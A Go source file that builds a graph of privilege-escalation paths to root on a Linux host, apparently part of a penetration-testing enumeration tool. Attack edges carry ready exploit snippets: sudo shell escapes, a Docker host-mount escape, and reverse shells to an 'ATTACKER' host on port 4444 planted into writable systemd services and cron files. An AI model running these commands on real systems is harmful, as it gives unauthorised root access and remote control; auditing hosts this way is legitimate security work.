package graph

import (
	"fmt"
	"pypengu/internal/models"
	"strings"
)

func BuildGraph(
	metadata models.Metadata,
	users []models.UserInfo,
	groups []models.GroupInfo,
	sudoEntries []models.SudoEntry,
	suidBinaries []models.SuidBinary,
	dockerInfo models.DockerInfo,
	services []models.ServiceInfo,
	cronJobs []models.CronJob,
	kernelInfo models.KernelInfo,
) models.GraphData {

	nodes := []models.Node{}
	edges := []models.Edge{}
	edgeID := 0

	currentUser := ""
	for _, user := range users {
		if user.IsCurrent {
			currentUser = user.Username
		}
		node := models.Node{
			ID:    fmt.Sprintf("user:%s", user.Username),
			Type:  "user",
			Label: user.Username,
			Properties: map[string]interface{}{
				"uid":        user.UID,
				"gid":        user.GID,
				"shell":      user.Shell,
				"home":       user.Home,
				"is_current": user.IsCurrent,
				"is_root":    user.IsRoot,
			},
		}
		nodes = append(nodes, node)
	}

	for _, group := range groups {
		node := models.Node{
			ID:    fmt.Sprintf("group:%s", group.Name),
			Type:  "group",
			Label: group.Name,
			Properties: map[string]interface{}{
				"gid":          group.GID,
				"is_privileged": group.Privileged,
			},
		}
		nodes = append(nodes, node)

		for _, member := range group.Members {
			edgeID++
			edge := models.Edge{
				ID:     fmt.Sprintf("e%d", edgeID),
				Source: fmt.Sprintf("user:%s", member),
				Target: fmt.Sprintf("group:%s", group.Name),
				Type:   "MemberOf",
				Risk:   determineGroupRisk(group.Privileged),
				Properties: map[string]interface{}{},
			}
			edges = append(edges, edge)
		}
	}

	for _, sudo := range sudoEntries {
		edgeID++
		
		edgeType := "SudoCommand"
		if sudo.Command == "ALL" {
			edgeType = "SudoAll"
		} else if sudo.NoPasswd {
			edgeType = "SudoNoPasswd"
		}
		
		sourceUser := sudo.User
		if sourceUser == "current" {
			sourceUser = currentUser
		}
		
		props := map[string]interface{}{
			"command":  sudo.Command,
			"nopasswd": sudo.NoPasswd,
			"entry":    sudo.Entry,
		}
		
		if sudo.GTFOBin {
			props["gtfobin"] = true
			props["gtfobin_url"] = sudo.GTFOUrl
			
			basename := sudo.Command
			if idx := strings.LastIndex(sudo.Command, "/"); idx != -1 {
				basename = sudo.Command[idx+1:]
			}
			
			if basename == "pkexec" {
				props["exploit_snippet"] = "sudo pkexec /bin/bash"
			} else if basename == "time" {
				props["exploit_snippet"] = "sudo time /bin/bash"
			} else if basename == "yelp" {
				props["exploit_snippet"] = "sudo yelp file:///etc/passwd"
			} else {
				props["exploit_snippet"] = fmt.Sprintf("sudo %s", sudo.Command)
			}
		}
		
		edge := models.Edge{
			ID:     fmt.Sprintf("e%d", edgeID),
			Source: fmt.Sprintf("user:%s", sourceUser),
			Target: "user:root",
			Type:   edgeType,
			Risk:   "critical",
			Properties: props,
		}
		edges = append(edges, edge)
	}

	for _, binary := range suidBinaries {
		label := binary.Path
		if len(binary.Path) > 20 {
			label = binary.Path[len(binary.Path)-20:]
		}
		
		node := models.Node{
			ID:    fmt.Sprintf("binary:%s", binary.Path),
			Type:  "binary",
			Label: label,
			Properties: map[string]interface{}{
				"path":    binary.Path,
				"owner":   binary.Owner,
				"suid":    true,
				"gtfobin": binary.GTFOBin,
			},
		}
		if binary.GTFOUrl != "" {
			node.Properties["gtfobin_url"] = binary.GTFOUrl
		}
		nodes = append(nodes, node)

		if binary.Owner == "root" && currentUser != "" {
			edgeID++
			edge := models.Edge{
				ID:     fmt.Sprintf("e%d", edgeID),
				Source: fmt.Sprintf("user:%s", currentUser),
				Target: fmt.Sprintf("binary:%s", binary.Path),
				Type:   "SuidBinary",
				Risk:   determineSuidRisk(binary.GTFOBin),
				Properties: map[string]interface{}{
					"path": binary.Path,
				},
			}
			if binary.GTFOUrl != "" {
				edge.Properties["gtfobin_url"] = binary.GTFOUrl
			}
			edges = append(edges, edge)
		}
	}

	if dockerInfo.HasDockerGroup || dockerInfo.SocketWritable {
		dockerGroupExists := false
		for _, group := range groups {
			if group.Name == "docker" {
				dockerGroupExists = true
				break
			}
		}
		
		if dockerGroupExists {
			edgeID++
			edge := models.Edge{
				ID:     fmt.Sprintf("e%d", edgeID),
				Source: "group:docker",
				Target: "user:root",
				Type:   "DockerAccess",
				Risk:   "critical",
				Properties: map[string]interface{}{
					"socket":           dockerInfo.SocketPath,
					"socket_writable":  dockerInfo.SocketWritable,
					"exploit_snippet": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
				},
			}
			edges = append(edges, edge)
		}
	}

	for _, service := range services {
		node := models.Node{
			ID:    fmt.Sprintf("service:%s", service.Name),
			Type:  "service",
			Label: service.Name,
			Properties: map[string]interface{}{
				"path":   service.Path,
				"run_as": service.RunAs,
				"state":  service.State,
			},
		}
		nodes = append(nodes, node)
		
		if currentUser != "" {
			edgeID++
			edge := models.Edge{
				ID:     fmt.Sprintf("e%d", edgeID),
				Source: fmt.Sprintf("user:%s", currentUser),
				Target: fmt.Sprintf("service:%s", service.Name),
				Type:   "WritableService",
				Risk:   "critical",
				Properties: map[string]interface{}{
					"path":              service.Path,
					"writable_by":       service.WritableBy,
					"exploit_snippet":   fmt.Sprintf("echo '[Service]\\nExecStart=/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > %s && systemctl daemon-reload", service.Path),
				},
			}
			edges = append(edges, edge)
		}
	}

	for _, cron := range cronJobs {
		label := cron.Path
		if len(cron.Path) > 15 {
			label = cron.Path[len(cron.Path)-15:]
		}
		
		node := models.Node{
			ID:    fmt.Sprintf("cron:%s", cron.Path),
			Type:  "cron",
			Label: label,
			Properties: map[string]interface{}{
				"path":     cron.Path,
				"schedule": cron.Schedule,
				"run_as":   cron.RunAs,
			},
		}
		nodes = append(nodes, node)
		
		if currentUser != "" {
			edgeID++
			edge := models.Edge{
				ID:     fmt.Sprintf("e%d", edgeID),
				Source: fmt.Sprintf("user:%s", currentUser),
				Target: fmt.Sprintf("cron:%s", cron.Path),
				Type:   "WritableCron",
				Risk:   "high",
				Properties: map[string]interface{}{
					"path":            cron.Path,
					"schedule":        cron.Schedule,
					"exploit_snippet": fmt.Sprintf("echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> %s", cron.Path),
				},
			}
			edges = append(edges, edge)
		}
	}

	if len(kernelInfo.CVEs) > 0 && currentUser != "" {
		for _, cve := range kernelInfo.CVEs {
			edgeID++
			edge := models.Edge{
				ID:     fmt.Sprintf("e%d", edgeID),
				Source: fmt.Sprintf("user:%s", currentUser),
				Target: "user:root",
				Type:   "KernelExploit",
				Risk:   "high",
				Properties: map[string]interface{}{
					"kernel_version": kernelInfo.Version,
					"cve":            cve.ID,
					"description":    cve.Description,
					"reference":      cve.Reference,
				},
			}
			edges = append(edges, edge)
		}
	}

	pathsToRoot := 0
	for _, edge := range edges {
		if edge.Risk == "critical" && edge.Target == "user:root" {
			pathsToRoot++
		}
	}

	stats := models.Stats{
		TotalNodes:  len(nodes),
		TotalEdges:  len(edges),
		PathsToRoot: pathsToRoot,
	}

	return models.GraphData{
		Metadata: metadata,
		Nodes:    nodes,
		Edges:    edges,
		Stats:    stats,
	}
}

func determineGroupRisk(privileged bool) string {
	if privileged {
		return "medium"
	}
	return "low"
}

func determineSuidRisk(isGTFO bool) string {
	if isGTFO {
		return "high"
	}
	return "medium"
}
